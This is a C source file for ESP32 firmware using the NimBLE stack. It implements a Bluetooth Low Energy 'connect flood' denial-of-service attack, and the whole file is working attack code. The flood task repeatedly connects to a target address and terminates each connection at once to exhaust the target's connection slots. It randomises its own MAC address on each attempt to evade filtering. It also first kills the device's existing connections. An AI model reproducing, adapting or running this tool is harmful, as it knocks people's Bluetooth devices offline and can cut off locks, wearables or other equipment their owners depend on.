/*
 * ble_connect_flood.c - BLE Connect Flood Attack Implementation
 *
 * Rapidly creates and drops BLE connections to a target device,
 * exhausting its limited connection slots (DoS).
 *
 * Thread safety:
 *   - `running` is volatile bool: set from stop()/timer, read in task
 *   - Counters are volatile uint32_t: atomic on 32-bit Xtensa
 *   - `cfg` is protected by mutex
 *   - `timeout_fired` is volatile for cross-task visibility
 *
 * Async flow:
 *   The GAP event callback NEVER calls vTaskDelay (which would block
 *   the entire NimBLE host task).  Instead it updates counters and
 *   gives `conn_done_sem` to wake the flood task, which then applies
 *   the appropriate delay before the next attempt.
 *
 * Dependencies:
 *   - ble_common.h  (nimble_port_init + own_addr_type helper)
 *   - NimBLE stack  (host + controller)
 *   - FreeRTOS
 *   - cJSON
 *   - esp_timer
 */

#include "ble_connect_flood.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "cJSON.h"
#include <string.h>

/* NimBLE headers */
#include "nimble/nimble_port.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"

#include "ble_common.h"

/* ================================================================== */
/*  Constants                                                          */
/* ================================================================== */

static const char *TAG = "ble_connect_flood";

#define DEFAULT_TIMEOUT_SEC         300
#define DEFAULT_CONNECT_INTERVAL_MS 1500
#define DEFAULT_SUCCESS_COOLDOWN_MS 5000
#define DEFAULT_FAIL_BACKOFF_MS     2000
#define DEFAULT_ADDR_TYPE           BLE_CF_ADDR_AUTO
#define DEFAULT_ROTATE_OWN_MAC      true
#define CONNECT_TIMEOUT_MS          5000
#define TASK_STACK_SIZE             4096
#define TASK_PRIORITY               5
#define STOP_SEM_TIMEOUT_MS         5000

/* ================================================================== */
/*  Module state                                                       */
/* ================================================================== */

/* Control */
static volatile bool running          = false;
static SemaphoreHandle_t mutex        = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;
static SemaphoreHandle_t conn_done_sem = NULL;
static TaskHandle_t task_handle       = NULL;

/* Timeout timer */
static esp_timer_handle_t timeout_timer = NULL;
static volatile bool timeout_fired     = false;

/* Timing */
static volatile int64_t start_time_ms = 0;

/* Counters (atomic on 32-bit Xtensa) */
static volatile uint32_t attempt_count  = 0;
static volatile uint32_t success_count  = 0;
static volatile uint32_t fail_count     = 0;

/* Connection state (written by callback, read by task) */
static volatile bool last_success      = false;
static volatile uint8_t active_addr_type = BLE_ADDR_PUBLIC;

/* Configuration (protected by mutex) */
static ble_connect_flood_config_t cfg = {
    .target_addr         = "",
    .timeout_sec         = DEFAULT_TIMEOUT_SEC,
    .connect_interval_ms = DEFAULT_CONNECT_INTERVAL_MS,
    .success_cooldown_ms = DEFAULT_SUCCESS_COOLDOWN_MS,
    .fail_backoff_ms     = DEFAULT_FAIL_BACKOFF_MS,
    .addr_type           = DEFAULT_ADDR_TYPE,
    .rotate_own_mac      = DEFAULT_ROTATE_OWN_MAC,
};

/* Proper connection parameters — aggressive for flood */
static const struct ble_gap_conn_params conn_params = {
    .scan_itvl          = 0x0010,   /* 10 ms scan interval    */
    .scan_window        = 0x0010,   /* 10 ms scan window      */
    .itvl_min           = 0x0006,   /* 7.5 ms (spec minimum)  */
    .itvl_max           = 0x000C,   /* 15 ms                  */
    .latency            = 0,
    .supervision_timeout = 0x0064,  /* 1 s — short, we'll kill it fast */
    .min_ce_len         = 0,
    .max_ce_len         = 0,
};

/* ================================================================== */
/*  Helpers                                                            */
/* ================================================================== */

/** Generate a BLE random static address (top 2 bits = 11). */
static void generate_random_addr(uint8_t addr[6])
{
    esp_fill_random(addr, 6);
    /* BLE spec: random static address has bits 1:0 of byte 5 set to 11 */
    addr[5] |= 0xC0;
}

/** Parse "AA:BB:CC:DD:EE:FF" → NimBLE little-endian byte array. */
static void addr_from_str(const char *s, uint8_t out[6])
{
    int vals[6] = {0};
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &vals[0], &vals[1], &vals[2],
               &vals[3], &vals[4], &vals[5]) == 6) {
        /* NimBLE stores addresses in little-endian (reversed) order */
        for (int i = 0; i < 6; i++) {
            out[i] = (uint8_t)vals[5 - i];
        }
    } else {
        memset(out, 0, 6);
    }
}

/** Return the addr type string for logging. */
static const char *addr_type_str(uint8_t type)
{
    return (type == BLE_ADDR_PUBLIC) ? "PUBLIC" : "RANDOM";
}

/* ================================================================== */
/*  Timeout timer callback                                             */
/* ================================================================== */

static void timeout_timer_cb(void *arg)
{
    ESP_LOGW(TAG, "Timeout reached (%u s) — stopping flood",
             (unsigned)cfg.timeout_sec);
    timeout_fired = true;
    running       = false;
}

/* ================================================================== */
/*  GAP event callback  (NO vTaskDelay — runs in NimBLE host context)  */
/* ================================================================== */

static int conn_event_cb(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {

    case BLE_GAP_EVENT_CONNECT:
        if (event->connect.status == 0) {
            /* ---- Connection succeeded ---- */
            success_count++;
            last_success = true;
            ESP_LOGI(TAG, "Connected! handle=%d  (success=%u)",
                     event->connect.conn_handle,
                     (unsigned)success_count);

            /* Terminate immediately to free the slot */
            int rc = ble_gap_terminate(event->connect.conn_handle,
                                       BLE_ERR_REM_USER_CONN_TERM);
            if (rc != 0) {
                ESP_LOGE(TAG, "ble_gap_terminate failed: %d", rc);
            }
            /* Do NOT give conn_done_sem here — wait for DISCONNECT event
               so the connection slot is fully released first. */
        } else {
            /* ---- Connection failed ---- */
            fail_count++;
            last_success = false;
            ESP_LOGW(TAG, "Connect failed: status=%d  (fails=%u)",
                     event->connect.status, (unsigned)fail_count);

            /* Status 13 = wrong address type → auto-switch */
            if (event->connect.status == 13 &&
                cfg.addr_type == BLE_CF_ADDR_AUTO) {
                active_addr_type = (active_addr_type == BLE_ADDR_PUBLIC)
                    ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;
                ESP_LOGI(TAG, "Status 13 → switching to %s",
                         addr_type_str(active_addr_type));
            }

            /* Failed connect: no DISCONNECT event coming → signal now */
            if (conn_done_sem) {
                xSemaphoreGive(conn_done_sem);
            }
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        ESP_LOGI(TAG, "Disconnected; reason=%d", event->disconnect.reason);
        /* Connection fully released → signal flood task */
        if (conn_done_sem) {
            xSemaphoreGive(conn_done_sem);
        }
        break;

    case BLE_GAP_EVENT_CONN_UPDATE:
        /* Ignore parameter update requests during flood */
        break;

    default:
        break;
    }
    return 0;
}

/* ================================================================== */
/*  Flood task                                                         */
/* ================================================================== */

static void flood_task(void *arg)
{
    ESP_LOGI(TAG, "Flood task started → target %s", cfg.target_addr);

    /* Kill any existing BLE connections (e.g. phone) before attacking */
    ble_common_disconnect_all();
    vTaskDelay(pdMS_TO_TICKS(1000));

    while (running) {
        /* ---- Don't overlap GAP procedures ---- */
        if (ble_gap_conn_active()) {
            vTaskDelay(pdMS_TO_TICKS(200));
            continue;
        }
        if (ble_gap_adv_active()) {
            ble_gap_adv_stop();
            vTaskDelay(pdMS_TO_TICKS(100));
        }
        if (ble_gap_disc_active()) {
            ble_gap_disc_cancel();
            vTaskDelay(pdMS_TO_TICKS(200));
        }

        /* ---- Optional: rotate our own MAC ---- */
        if (cfg.rotate_own_mac) {
            uint8_t rnd_addr[6];
            generate_random_addr(rnd_addr);
            int rc = ble_hs_id_set_rnd(rnd_addr);
            if (rc != 0) {
                ESP_LOGD(TAG, "ble_hs_id_set_rnd failed: %d (non-fatal)", rc);
            }
        }

        /* ---- Determine address type ---- */
        uint8_t use_addr_type = active_addr_type;
        if (cfg.addr_type == BLE_CF_ADDR_PUBLIC) {
            use_addr_type = BLE_ADDR_PUBLIC;
        } else if (cfg.addr_type == BLE_CF_ADDR_RANDOM) {
            use_addr_type = BLE_ADDR_RANDOM;
        }
        /* BLE_CF_ADDR_AUTO → use active_addr_type (may flip on status 13) */

        /* ---- Build peer address ---- */
        xSemaphoreTake(mutex, portMAX_DELAY);
        char copy[32];
        strncpy(copy, cfg.target_addr, sizeof(copy) - 1);
        copy[sizeof(copy) - 1] = '\0';
        xSemaphoreGive(mutex);

        uint8_t addr_val[6];
        addr_from_str(copy, addr_val);

        ble_addr_t peer;
        peer.type = use_addr_type;
        memcpy(peer.val, addr_val, 6);

        /* ---- Determine own address type ---- */
        uint8_t own_addr_type;
        if (cfg.rotate_own_mac) {
            own_addr_type = BLE_ADDR_RANDOM;
        } else {
            own_addr_type = ble_common_own_addr_type();
        }

        ESP_LOGI(TAG, "Attempting connect to %s (peer=%s, own=%s, attempt=%u)",
                 copy,
                 addr_type_str(use_addr_type),
                 cfg.rotate_own_mac ? "RANDOM(rotated)" : addr_type_str(own_addr_type),
                 (unsigned)(attempt_count + 1));

        /* ---- Initiate connection ---- */
        int rc = ble_gap_connect(own_addr_type, &peer,
                                 CONNECT_TIMEOUT_MS,
                                 &conn_params, conn_event_cb, NULL);

        if (rc == 0) {
            /* Connection initiated — wait for callback to signal completion */
            attempt_count++;

            if (conn_done_sem) {
                /* Wait up to 10 s for the connect/disconnect cycle */
                if (xSemaphoreTake(conn_done_sem, pdMS_TO_TICKS(10000))
                    != pdTRUE) {
                    ESP_LOGW(TAG, "Timed out waiting for connect cycle");
                }
            }

            /* Apply post-cycle delay based on outcome */
            if (last_success) {
                /* Successful connect+disconnect → longer cooldown */
                vTaskDelay(pdMS_TO_TICKS(cfg.success_cooldown_ms));
            } else {
                /* Failed connect → shorter backoff */
                vTaskDelay(pdMS_TO_TICKS(cfg.fail_backoff_ms));
            }
        } else {
            /* ble_gap_connect() itself failed */
            attempt_count++;
            fail_count++;

            if (rc == BLE_HS_EALREADY) {
                ESP_LOGD(TAG, "Connection already in progress");
                vTaskDelay(pdMS_TO_TICKS(500));
            } else if (rc == BLE_HS_EBUSY) {
                ESP_LOGD(TAG, "BLE host busy, waiting...");
                vTaskDelay(pdMS_TO_TICKS(1000));
            } else {
                ESP_LOGW(TAG, "ble_gap_connect returned %d", rc);
                vTaskDelay(pdMS_TO_TICKS(cfg.fail_backoff_ms));
            }
        }

        /* Base rate limit between attempts */
        vTaskDelay(pdMS_TO_TICKS(cfg.connect_interval_ms));
    }

    /* ---- Task cleanup ---- */
    /* If a connection is still active, terminate it */
    if (ble_gap_conn_active()) {
        /* Find and terminate any active connection.
         * NimBLE doesn't expose a "get all handles" API, so we rely on
         * the callback having already cleaned up.  If somehow a
         * connection is still active, it will time out via
         * supervision_timeout. */
        ESP_LOGW(TAG, "Connection still active at task exit — will time out");
    }

    ESP_LOGI(TAG, "Flood task exiting (attempts=%u, success=%u, fail=%u)",
             (unsigned)attempt_count,
             (unsigned)success_count,
             (unsigned)fail_count);

    task_handle = NULL;
    if (task_exit_sem) {
        xSemaphoreGive(task_exit_sem);
    }
    vTaskDelete(NULL);
}

/* ================================================================== */
/*  Public API — init                                                  */
/* ================================================================== */

void ble_connect_flood_init(void)
{
    if (mutex == NULL) {
        mutex = xSemaphoreCreateMutex();
    }
    if (task_exit_sem == NULL) {
        task_exit_sem = xSemaphoreCreateBinary();
    }
    if (conn_done_sem == NULL) {
        conn_done_sem = xSemaphoreCreateBinary();
    }

    /* Ensure BLE stack is ready */
    ble_common_init();

    ESP_LOGI(TAG, "ble_connect_flood initialized");
}

/* ================================================================== */
/*  Public API — start                                                 */
/* ================================================================== */

void ble_connect_flood_start_config(const ble_connect_flood_config_t *user_cfg)
{
    if (running) {
        ESP_LOGW(TAG, "Already running — stop first");
        return;
    }
    if (mutex == NULL) {
        mutex = xSemaphoreCreateMutex();
    }

    /* Apply configuration */
    xSemaphoreTake(mutex, portMAX_DELAY);
    if (user_cfg) {
        memcpy(&cfg, user_cfg, sizeof(cfg));
    }
    /* Enforce sane defaults for zeroed fields */
    if (cfg.timeout_sec == 0)         cfg.timeout_sec         = DEFAULT_TIMEOUT_SEC;
    if (cfg.connect_interval_ms == 0) cfg.connect_interval_ms = DEFAULT_CONNECT_INTERVAL_MS;
    if (cfg.success_cooldown_ms == 0) cfg.success_cooldown_ms = DEFAULT_SUCCESS_COOLDOWN_MS;
    if (cfg.fail_backoff_ms == 0)     cfg.fail_backoff_ms     = DEFAULT_FAIL_BACKOFF_MS;
    xSemaphoreGive(mutex);

    /* Reset counters */
    attempt_count  = 0;
    success_count  = 0;
    fail_count     = 0;
    timeout_fired  = false;
    last_success   = false;
    start_time_ms  = esp_timer_get_time() / 1000;

    /* Set initial address type */
    switch (cfg.addr_type) {
    case BLE_CF_ADDR_PUBLIC:
        active_addr_type = BLE_ADDR_PUBLIC;
        break;
    case BLE_CF_ADDR_RANDOM:
        active_addr_type = BLE_ADDR_RANDOM;
        break;
    case BLE_CF_ADDR_AUTO:
    default:
        active_addr_type = BLE_ADDR_PUBLIC;
        break;
    }

    /* ---- Start timeout timer ---- */
    if (timeout_timer != NULL) {
        esp_timer_stop(timeout_timer);
        esp_timer_delete(timeout_timer);
        timeout_timer = NULL;
    }
    const esp_timer_create_args_t timer_args = {
        .callback = timeout_timer_cb,
        .name     = "ble_cf_timeout",
    };
    esp_timer_create(&timer_args, &timeout_timer);
    esp_timer_start_once(timeout_timer, (int64_t)cfg.timeout_sec * 1000000);

    /* ---- Clear semaphore & start task ---- */
    running = true;

    if (task_exit_sem != NULL) {
        xSemaphoreTake(task_exit_sem, 0);   /* clear pending */
    }
    if (conn_done_sem != NULL) {
        xSemaphoreTake(conn_done_sem, 0);   /* clear pending */
    }

    BaseType_t ret = xTaskCreate(flood_task, "ble_conn_fl",
                                 TASK_STACK_SIZE, NULL,
                                 TASK_PRIORITY, &task_handle);
    if (ret != pdPASS) {
        ESP_LOGE(TAG, "Failed to create flood task");
        running = false;
        if (timeout_timer) {
            esp_timer_stop(timeout_timer);
            esp_timer_delete(timeout_timer);
            timeout_timer = NULL;
        }
    }
}

void ble_connect_flood_start(const char *target_addr)
{
    ble_connect_flood_config_t def = {
        .target_addr         = "",
        .timeout_sec         = DEFAULT_TIMEOUT_SEC,
        .connect_interval_ms = DEFAULT_CONNECT_INTERVAL_MS,
        .success_cooldown_ms = DEFAULT_SUCCESS_COOLDOWN_MS,
        .fail_backoff_ms     = DEFAULT_FAIL_BACKOFF_MS,
        .addr_type           = DEFAULT_ADDR_TYPE,
        .rotate_own_mac      = DEFAULT_ROTATE_OWN_MAC,
    };
    if (target_addr) {
        strncpy(def.target_addr, target_addr, sizeof(def.target_addr) - 1);
        def.target_addr[sizeof(def.target_addr) - 1] = '\0';
    }
    ble_connect_flood_start_config(&def);
}

/* ================================================================== */
/*  Public API — stop                                                  */
/* ================================================================== */

void ble_connect_flood_stop(void)
{
    if (!running) return;

    running = false;

    /* Stop timeout timer */
    if (timeout_timer != NULL) {
        esp_timer_stop(timeout_timer);
        esp_timer_delete(timeout_timer);
        timeout_timer = NULL;
    }

    /* Wake the flood task if it's blocked on conn_done_sem */
    if (conn_done_sem) {
        xSemaphoreGive(conn_done_sem);
    }

    /* Wait for task to exit */
    if (task_exit_sem != NULL) {
        if (xSemaphoreTake(task_exit_sem,
                           pdMS_TO_TICKS(STOP_SEM_TIMEOUT_MS)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout — forcing delete");
            if (task_handle != NULL) {
                vTaskDelete(task_handle);
                task_handle = NULL;
            }
        }
    } else {
        vTaskDelay(pdMS_TO_TICKS(1000));
        if (task_handle != NULL) {
            vTaskDelete(task_handle);
            task_handle = NULL;
        }
    }

    ESP_LOGI(TAG, "Flood stopped (attempts=%u, success=%u, fail=%u, elapsed=%ds)",
             (unsigned)attempt_count,
             (unsigned)success_count,
             (unsigned)fail_count,
             (int)ble_connect_flood_get_elapsed_sec());
}

/* ================================================================== */
/*  Public API — status getters                                        */
/* ================================================================== */

bool ble_connect_flood_is_running(void)
{
    return running;
}

uint32_t ble_connect_flood_get_attempt_count(void)
{
    return attempt_count;
}

uint32_t ble_connect_flood_get_success_count(void)
{
    return success_count;
}

uint32_t ble_connect_flood_get_fail_count(void)
{
    return fail_count;
}

int32_t ble_connect_flood_get_elapsed_sec(void)
{
    if (start_time_ms == 0) return 0;
    int64_t now = esp_timer_get_time() / 1000;
    int32_t elapsed = (int32_t)((now - start_time_ms) / 1000);
    return (elapsed > 0) ? elapsed : 0;
}

int32_t ble_connect_flood_get_remaining_sec(void)
{
    if (!running) return 0;
    int32_t elapsed  = ble_connect_flood_get_elapsed_sec();
    int32_t timeout  = (int32_t)cfg.timeout_sec;
    int32_t remaining = timeout - elapsed;
    return (remaining > 0) ? remaining : 0;
}

bool ble_connect_flood_was_timeout(void)
{
    return timeout_fired;
}

cJSON *ble_connect_flood_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();

    cJSON_AddBoolToObject(root, "running", running);
    cJSON_AddNumberToObject(root, "attempt_count", (double)attempt_count);
    cJSON_AddNumberToObject(root, "success_count", (double)success_count);
    cJSON_AddNumberToObject(root, "fail_count",    (double)fail_count);
    cJSON_AddNumberToObject(root, "elapsed_sec",   (double)ble_connect_flood_get_elapsed_sec());
    cJSON_AddNumberToObject(root, "remaining_sec",  (double)ble_connect_flood_get_remaining_sec());
    cJSON_AddBoolToObject(root,  "timeout", timeout_fired);

    xSemaphoreTake(mutex, portMAX_DELAY);
    cJSON_AddStringToObject(root, "target_addr", cfg.target_addr);
    cJSON_AddNumberToObject(root, "timeout_sec",         (double)cfg.timeout_sec);
    cJSON_AddNumberToObject(root, "connect_interval_ms",  (double)cfg.connect_interval_ms);
    cJSON_AddNumberToObject(root, "success_cooldown_ms",  (double)cfg.success_cooldown_ms);
    cJSON_AddNumberToObject(root, "fail_backoff_ms",      (double)cfg.fail_backoff_ms);

    const char *mode_str;
    switch (cfg.addr_type) {
    case BLE_CF_ADDR_PUBLIC: mode_str = "PUBLIC";   break;
    case BLE_CF_ADDR_RANDOM: mode_str = "RANDOM";   break;
    case BLE_CF_ADDR_AUTO:   mode_str = "AUTO";     break;
    default:                 mode_str = "UNKNOWN";  break;
    }
    cJSON_AddStringToObject(root, "addr_type", mode_str);
    cJSON_AddStringToObject(root, "active_addr_type",
                            addr_type_str(active_addr_type));
    cJSON_AddBoolToObject(root, "rotate_own_mac", cfg.rotate_own_mac);
    xSemaphoreGive(mutex);

    return root;
}
